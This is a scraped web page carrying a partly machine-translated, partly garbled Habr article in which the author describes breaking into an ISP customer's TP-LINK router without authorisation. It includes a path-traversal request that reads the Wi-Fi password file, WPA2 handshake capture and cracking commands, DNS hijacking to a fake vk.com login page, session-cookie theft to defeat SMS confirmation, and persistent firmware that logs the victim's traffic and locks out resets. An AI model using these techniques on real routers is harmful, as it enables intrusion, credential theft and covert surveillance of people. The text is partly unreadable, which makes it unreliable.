<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üå¨Ô∏è üòù üíáüèæ –ö —á–µ–º—É –º–æ–≥—É—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ —Ä–æ—É—Ç–µ—Ä–∞—Ö TP-LINK üîä üò∑ üë¥üèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="TP-LINK, , - . , . , .
 
 , , . , , , TightVNC backconnect‚Äô IP + VLC player, IP. VirusTotal. . , ( cookies ), , .
 
 , ‚Äì , . , , N ( ), : 8080. , web-...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>–ö —á–µ–º—É –º–æ–≥—É—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ —Ä–æ—É—Ç–µ—Ä–∞—Ö TP-LINK</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/381573/">              TP-LINK,    ,        -       .      ,          .       ,       .<br>
<br>
         ,        ,     . ,    ,   ,           TightVNC  backconnect‚Äô   IP +  VLC player,             IP.           VirusTotal.      .      ,       (  cookies   ),        ,      .<br>
<br>
,    ‚Äì  ,    .   ,    ,         N (       ),    :      8080.   ,   web- .       admin admin (       ),  ,       ,       ,    . ,  90%    TP-Link TL-WR741ND   740N, 841N, 941ND.<br>
<br>
<img src="https://habrastorage.org/getpro/geektimes/post_images/256/603/b26/256603b26f76e009b2a3bf2bae2abea9.jpg" alt="imagem"><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tudo √© muito claro aqui: o provedor aluga os mesmos roteadores para os usu√°rios, os configura para instala√ß√£o durante a instala√ß√£o e √© muito pregui√ßoso para os usu√°rios alterar essas configura√ß√µes. Tornou-se cada vez mais interessante. Certamente, nesse caso, deve haver algum padr√£o na configura√ß√£o, ou seja, as senhas provavelmente s√£o as mesmas. Decidi pesquisar no Google se havia alguma vulnerabilidade nesses modelos e, para minha surpresa na √©poca, encontrei muitas delas. A primeira coisa que me chamou a aten√ß√£o foi o artigo </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"Backdoor em roteadores TP-LINK"</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Decidi imediatamente verificar essa vulnerabilidade. Os arquivos foram enviados para o roteador, mas ele n√£o os aceitou, e ent√£o comecei a pensar sobre o que √© esse nart.out. Este √© um bin√°rio MIPS, que em ess√™ncia pode ser qualquer aplicativo, voc√™ s√≥ precisa constru√≠-lo. Para come√ßar, comecei a procurar uma vers√£o pronta, porque antes, quase nunca tinha que lidar com compila√ß√£o cruzada. Para minha surpresa, naquele momento, outra pessoa estava interessada nessa quest√£o: </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Specx2</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (eu recomendo, ali√°s, que leia seu </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">artigo</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sobre como montar uma esta√ß√£o de hackers a partir de um roteador, o que, de fato, eu fiz no final, apenas remotamente). Ele conseguiu encontrar o netcat compilado sob o MIPS em um dos f√≥runs chineses, a prop√≥sito, exatamente na se√ß√£o em que essa vulnerabilidade foi discutida. Este bin√°rio foi lan√ßado com √™xito no QEMU, foi derramado com sucesso no roteador atrav√©s da porta traseira encontrada, mas, por algum motivo, n√£o foi poss√≠vel conectar-se ao roteador: apenas n√£o tinha uma conex√£o. O camarada Specx2 </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sugeriu</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> que o ponto pode ser que a porta 2222 possa simplesmente ser fechada e voc√™ precisa de alguma forma fazer o netcat rodar em outra porta.</font></font><br>
<br>
    netcat  MIPS,         .    ,    .         Notepad++, ,       2222.          ,  ‚Äì       .   ,     QEMU,            .<br>
<br>
             .     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="> </a>.  :  841  941     <br>
<pre><code class="bash hljs">/userRpmNatDebugRpm26525557/linux_cmdline.html
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Somente aqui a senha do roteador ainda precisava ser conhecida, e os usu√°rios desse provedor tinham basicamente 741 modelos. Consegui encontrar um roteador com uma senha padr√£o e esse shell, embora muito truncado. Assim, eu tenho acesso ao sistema de arquivos do roteador. Infelizmente, n√£o consegui encontrar nada de valor e o shell n√£o funcionou corretamente. Os desenvolvedores est√£o realmente fazendo a depura√ß√£o por meio dele? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Parecia um beco sem sa√≠da, por um longo tempo eu n√£o tinha uma √∫nica pista, mas algo me disse que ainda havia vulnerabilidades. E ent√£o eu descobri que o roteador n√£o filtra solicita√ß√µes GET. Ou seja, por padr√£o, quando a senha √© digitada incorretamente, a p√°gina / help √© aberta, mas se, por exemplo, fizermos esta solicita√ß√£o:</font></font><br>
<pre><code class="bash hljs">GET IP:port/<span class="hljs-built_in">help</span>/../../
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em seguida, chegaremos √† raiz do sistema de arquivos do roteador. Assim, podemos baixar quase qualquer arquivo do roteador FS sem nem mesmo saber a senha. Essa foi a primeira vulnerabilidade de trabalho bem-sucedida de tudo o que encontrei. Mas o que isso nos d√° se conseguirmos apenas baixar arquivos e n√£o soubermos onde a senha est√° armazenada? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ap√≥s uma breve pesquisa, ainda consegui encontrar um arquivo interessante em /tmp/ath0.ap_bss, que armazena a senha do Wi-Fi de forma clara. Decidi imediatamente verific√°-lo em um dos roteadores de usu√°rios desse provedor.</font></font><br>
<pre><code class="bash hljs">GET IP:8080/<span class="hljs-built_in">help</span>/../../tmp/ath0.ap_bss
</code></pre><br>
 ,     ,      web-   Wi-Fi,  ,    Wi-Fi    ,       web-.  ,  8 .  ‚Äì   .   8.            ,    ,  ,      . ,         ,     ,        .         . SSID       IP- ,      .   ,           .      IP   .           IP.<br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Apesar do fato de todos os usu√°rios terem um IP externo real (embora din√¢mico), decidi criar um servidor VPN em v√°rios roteadores da ASUS, onde havia uma senha padr√£o. Felizmente, esse recurso foi costurado no firmware padr√£o. Assim, eu tive acesso √† rede interna do provedor.</font></font><br>
<br>
      .     IP .  ,  .      IP,    .  ,  . -,    ping-,   . -,  ,       (      TTL, . .       Windows,  TTL    128),      . ,    ,      ,       .   ,        LAN,            ,       ,     ,          ,   .     ,     <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/ dev / mtdblock3</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , mas esse bloco n√£o est√° montado, portanto, √© imposs√≠vel l√™-lo atrav√©s da vulnerabilidade descrita. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aprendi tamb√©m que o login da conex√£o VPN para acessar a Internet s√£o as iniciais e o sobrenome do usu√°rio ou parte dele, e a senha √© a mesma. Comecei a pensar: como posso encontrar o usu√°rio de que preciso? Talvez eu ainda tenha cometido o erro de definir o IP dessa vez, e ele j√° conseguiu mudar enquanto eu tentava me conectar ao webmord? A primeira coisa que veio √† mente foi uma simples enumera√ß√£o de todos os roteadores. Mas o n√∫mero de assinantes no provedor √© bastante grande. Depois de digitalizar todo o intervalo, encontrei cerca de 3.000 roteadores com acesso remoto √† interface da web. E era necess√°rio, de alguma forma, encontrar entre eles o caminho certo, se houver.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Primeiro, tentei escrever um script que reconhecesse a senha usando a vulnerabilidade encontrada e, em seguida, baixaria a p√°gina de configura√ß√£o de rede e a salvaria. Mas sou fraco nisso e, depois de descartar essa ideia depois de um tempo, decidi usar um clicker comum. Com tristeza ao meio, eu (ou melhor, o clicker) processei todo o intervalo. Em seguida, procurei nos arquivos de configura√ß√µes (na esperan√ßa de encontrar a v√≠tima pelo sobrenome no logon da conex√£o VPN), mas n√£o encontrei o que precisava.</font></font><br>
<br>
     ,       web-     .  ,     :     ,         Wi-Fi     web-   LAN, . .            ,      .         .   ?<br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lembre-se de que a segunda parte do IP interno est√° contida no SSID. Isso coincide com o n√∫mero do contrato. Seria bom conhecer o SSID do ponto de acesso do usu√°rio para que voc√™ possa encontr√°-lo. O que eu fiz? Sim, peguei e escrevi para o suporte t√©cnico do provedor, apresentando-me como usu√°rio, supostamente quero pagar pela Internet, mas esqueci o n√∫mero do contrato. E recebi instantaneamente uma resposta, pois sabia o nome e o endere√ßo. Assim, reconheci o IP interno da v√≠tima, que por sinal √© est√°tico (por isso n√£o faz sentido calcular constantemente a din√¢mica externa, pois existe acesso √† rede interna via VPN em um dos roteadores invadidos). Eu tamb√©m obtive o SSID estimado desse usu√°rio, ent√£o j√° tinha algo com o que trabalhar.</font></font><br>
<br>
   ,                 SSID.       ,  ,        ,     .   ,  ,       IP   .    ,      ,     ,  : 10.168.155.0  10.168.158.0.  ,     ,    ,        .  ,  SSID   ,    2- ,      .    :   ,  ,      .    ,    SSID,   , .   .<br>
<br>
!  ,   , , ,     .   ?  -     ,        handshake      (  WPA2-PSK),   WPS PIN, . .   WPS ,        10  .       -  ?       .        OpenWRT,         ,        aircrack-ng, reaver   .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Specx2</a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">at√© Bully se reuniu embaixo dele. Havia apenas um problema: como atualizar o roteador remotamente e n√£o perder o acesso a ele? Afinal, depois de piscar, todas as configura√ß√µes s√£o redefinidas para o padr√£o. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Fiquei atormentado com esse problema por um longo tempo, pensei que era necess√°rio coletar todo o firmware a partir do zero e de alguma forma pr√©-dirigir as configura√ß√µes l√°, mas tudo acabou sendo muito mais simples. Eu nem sabia da exist√™ncia do </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OpenWRT Image Builder</font></font></a>.      ,       , . .      4MB,   ,  ,        .     ,          VPN    ,       ,      .  ,    ,     .     (           ),         <b>monitor mode</b><br>
<pre><code class="bash hljs">ifconfig wlan0 down<font></font>
iw reg <span class="hljs-built_in">set</span> BO<font></font>
iwconfig wlan0 txpower 27<font></font>
airmon-ng start wlan0<font></font>
</code></pre><br>
  <b>airodump-ng</b>.<br>
<pre><code class="bash hljs">airodump-ng mon0 ‚Äìc _ ‚Äìbssid MAC__ ‚Äìw /tmp/123
</code></pre><br>
 handshake   .          <b>SCP</b><br>
<pre><code class="bash hljs">scp ‚ÄìP port user@host:/tmp/123-01.cap ~/123.cap
</code></pre><br>
      Wireshark:<br>
<pre><code class="bash hljs">wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x04 || eapol
</code></pre><br>
 <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="></a>   .hccap  Hashcat.     ,       ,         ,       .<br>
<pre><code class="bash hljs">oclHashcat64.exe ‚Äìm2500 ‚Äìa0 123.hccap wordlist.txt
</code></pre><br>
 ,       !      -      !   WAN      ,      .      ,    ,       ,        (  ,          ).    web-   admin admin.<br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tudo ocorreu bem! Eu j√° preparei um plano de a√ß√£o adicional. No meu IP real sem filtragem, criei o servidor DNS, onde alterei a entrada para vk.com e alterei para meu IP, onde tamb√©m foi criado o servidor HTTP com PHP. L√°, portanto, o fake foi preenchido com a p√°gina de autoriza√ß√£o do vk.com e, no roteador, o servidor DNS foi alterado para o meu. Um usu√°rio, acessando o vk.com, foi enganado e, portanto, a senha era minha, o objetivo foi alcan√ßado!</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Por muito tempo, usei esse m√©todo para obter uma senha, mas uma vez que a confirma√ß√£o de login no vk.com foi ativada, o que, segundo os pr√≥prios criadores, √© quase imposs√≠vel de contornar. A linha inferior √© que, ao autorizar a partir de um novo dispositivo / navegador, se voc√™ digitar a senha correta, tamb√©m dever√° inserir o c√≥digo do SMS, que √© enviado ao n√∫mero do propriet√°rio. Mas, neste caso, h√° muito tempo preparo uma teoria que ainda n√£o foi testada.</font></font><br>
<br>
    ,     ,      .    :     Cookie (    ,   remixttpid),      .       ,    .   , User-Agent   .  ,     cookie,      ,     :      mitmproxy,  ,        .          .   ,  ,       ?        ,          ! ,  -   <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">remixsid</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , que tamb√©m √© transmitido por uma conex√£o n√£o </font><i><font style="vertical-align: inherit;">segura</font></i><font style="vertical-align: inherit;"> , porque o usu√°rio n√£o usa https. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O problema era apenas que </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">remixsid</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ele corresponde ao IP do usu√°rio e, se for alterado, tamb√©m s√£o usados ‚Äã‚Äãcookies para login.vk.com, que s√£o transmitidos apenas por uma conex√£o criptografada e √© mais dif√≠cil intercept√°-los. Mas eu tive sorte. Naquele momento, o provedor come√ßou a fornecer acesso √† Internet sem a necessidade de estabelecer uma conex√£o VPN, o que significa que eu poderia apenas aumentar meu servidor PPTP e estabelecer uma conex√£o nas configura√ß√µes do roteador do usu√°rio. Assim fiz, todo o tr√°fego passou por mim e o usu√°rio, sem saber, criou uma sess√£o anexada ao meu IP, que foi interceptada sem problemas. Em seguida, retornei as configura√ß√µes anteriores e usei a sess√£o interceptada (o benef√≠cio do IP √© est√°tico). Prote√ß√£o de SMS quebrada com sucesso!</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tudo ficaria bem, mas eu n√£o parei por a√≠. O fato √© que, se o usu√°rio entender de repente qual √© o problema, ele simplesmente poder√° alterar a senha nas configura√ß√µes do roteador e no Wi-Fi. Para evitar isso, comecei a criar o OpenWRT sob um roteador de usu√°rio. Era necess√°rio prever tudo. Para um monitoramento conveniente do tr√°fego de v√≠timas, montei o servidor FTP como um sistema de arquivos usando o curlftpfs. Despejos s√£o escritos l√°. Todo esse processo √© descrito neste </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">artigo</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Inicialmente, planejei montar a nuvem como um sistema de arquivos, para o qual usei </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">davfs2</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , o que tamb√©m n√£o foi f√°cil </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">de construir no OpenWRT</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, mas o problema era que o arquivo foi gravado primeiro no cache e s√≥ depois foi derramado na nuvem. </font><font style="vertical-align: inherit;">Conseq√ºentemente, o tamanho do arquivo foi limitado pelo tamanho do cache, que √© extremamente pequeno. </font><font style="vertical-align: inherit;">Ent√£o eu escolhi o curlftpfs. </font><font style="vertical-align: inherit;">O tr√°fego foi gravado usando o tcpdump e foi dividido em arquivos de 512 MB.</font></font><br>
<pre><code class="bash hljs">tcpdump -i br-lan -w /root/ftp/dump/`date +<span class="hljs-string">"%d_%m_%Y_%T_"</span>` -C 512Mb &amp;
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Onde / root / ftp / dump √© o nosso sistema de arquivos ftp. </font><font style="vertical-align: inherit;">Todo esse neg√≥cio pode ser iniciado automaticamente (/etc/rc.local). </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em geral, o conjunto final de pacotes para o firmware OpenWRT Attitude Adjustment 12.09 tinha a seguinte apar√™ncia:</font></font><br>
<pre><code class="bash hljs">make image PROFILE=TLWR740 PACKAGES=<span class="hljs-string">"curlftpfs tcpdump tinyproxy wireless-tools -ppp -ppp-mod-pppoe"</span> FILES=files/
</code></pre><br>
Curlftpfs    ,        ftp. Tcpdump      ,  tinyproxy ‚Äì     IP ,  ,  <i>remixsid</i>  ,            IP   tinyproxy,           :<br>
<pre><code class="bash hljs">iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to ip:port
</code></pre><br>
 ,    .        ftp  ,    <b>opkg ‚Äìdest</b>,           <b>/etc/opkg.conf</b>.            .<br>
<pre><code class="bash hljs">/etc/firewall.user<font></font>
/etc/config/firewall<font></font>
/etc/config/network<font></font>
/etc/config/system<font></font>
/etc/config/wireless<font></font>
/etc/rc.local<font></font>
 .<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Todos esses arquivos devem ser preparados com anteced√™ncia para incorpor√°-los no firmware. </font><font style="vertical-align: inherit;">Na verdade, o que isso nos d√° al√©m dos recursos adicionais? </font><font style="vertical-align: inherit;">Mas o fato √© que o sistema de arquivos squashfs √© somente leitura. </font><font style="vertical-align: inherit;">Consequentemente, o usu√°rio n√£o poder√° alterar as configura√ß√µes padr√£o que defini de nenhuma maneira. </font><font style="vertical-align: inherit;">Com toda a sua vontade, mesmo atrav√©s do telnet, ele n√£o poder√° se conectar, </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">porque</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> no </font><i><font style="vertical-align: inherit;">rc.local</font></i><font style="vertical-align: inherit;"> , que √© costurado no firmware, existe uma linha</font></font><br>
<pre><code class="bash hljs"><span class="hljs-built_in">echo</span> ‚Äìe ‚Äúpass\npass‚Äù | passwd root
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ou seja, o acesso via telnet √© cortado imediatamente ap√≥s o carregamento do roteador, e somente eu tenho a senha SSH. </font><font style="vertical-align: inherit;">A redefini√ß√£o para o padr√£o com um bot√£o f√≠sico tamb√©m falhar√° aqui, porque o padr√£o √© definido por mim e costurado no firmware. </font><font style="vertical-align: inherit;">O objetivo √© alcan√ßado.</font></font><br>
<br>
       IPoE       VPN,     NAT‚Äô,  ,      VPN      .  ,     ¬´ IP¬ª, .    : ,    IP,     VPN    .      OpenWRT     PPTP- (   -  ),       OpenVPN .      ,      .     (    real IP)  ,          OpenVPN.<br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O problema com a conex√£o da VPN PPTP foi que os servidores do provedor n√£o suportam criptografia. </font><font style="vertical-align: inherit;">Isso foi corrigido adicionando uma linha ao </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/ppp/options.pptp</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<pre><code class="bash hljs">nomppe
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Caso contr√°rio, o processo de configura√ß√£o do cliente VPN PPTP e do servidor OpenVPN n√£o foi diferente dos manuais do OpenWRT. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Espero que este artigo seja interessante para algu√©m e algu√©m aprenda algo novo com ele. </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UPD:</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Como o </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ValdikSS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> escreveu nos coment√°rios </font><font style="vertical-align: inherit;">, em vez de curlftpfs + tinyproxy, voc√™ pode usar o OpenSSH, que √© mais funcional.</font></font></div>
      
    </div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt381573/">https://habr.com/ru/post/pt381573/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt381559/index.html">Ultrabook anti-crise: barato e alegre</a></li>
<li><a href="../pt381563/index.html">Como a inova√ß√£o tecnol√≥gica mudar√° a vida cotidiana</a></li>
<li><a href="../pt381565/index.html">Medidor de energia ou como medir a efici√™ncia da tomada</a></li>
<li><a href="../pt381567/index.html">O Twitter removeu an√∫ncios que poderiam levar a um ataque epil√©tico</a></li>
<li><a href="../pt381569/index.html">Instru√ß√µes de montagem da impressora 3D Prism Uni 3D (parte 2 - eletricista)</a></li>
<li><a href="../pt381575/index.html">O homem subiu ao palco da Broadway para carregar seu smartphone. "A lua cheia ou o idiota?"</a></li>
<li><a href="../pt381577/index.html">Rob√¥s de trabalho</a></li>
<li><a href="../pt381581/index.html">Os dez principais servidores e atualiza√ß√µes de 2015</a></li>
<li><a href="../pt381583/index.html">Um peda√ßo de massa</a></li>
<li><a href="../pt381585/index.html">–ê–≤—Ç–æ–º–æ–±–∏–ª—å Honda —É—Å—Ç–∞–Ω–æ–≤–∏–ª –º–∏—Ä–æ–≤–æ–π —Ä–µ–∫–æ—Ä–¥ –ø–æ —Ä–∞—Å—Ö–æ–¥—É —Ç–æ–ø–ª–∏–≤–∞: 2.4 –ª–∏—Ç—Ä–∞ –Ω–∞ 100 –∫–º</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>